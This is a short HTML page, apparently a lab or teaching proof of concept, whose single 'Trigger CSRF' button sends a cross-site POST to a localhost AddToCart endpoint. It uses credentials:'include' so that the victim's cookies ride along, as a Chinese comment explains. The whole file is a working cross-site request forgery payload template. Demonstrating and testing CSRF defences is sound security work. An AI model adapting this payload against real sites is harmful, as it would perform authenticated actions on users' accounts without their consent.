<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trigger CSRF</title>
</head>
<body>

<button style="font-size: 100px;" onclick="
    fetch('https://localhost:7057/Home/AddToCart', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
            'id': 1 
        }),
        credentials: 'include'  // 這行確保請求包含cookie
    })
    .then(response => response.text())
    .then(data => {
        console.log('Success:', data);  
    })
    .catch((error) => {
        console.error('Error:', error);
    });
">Trigger CSRF</button>

</body>
</html>
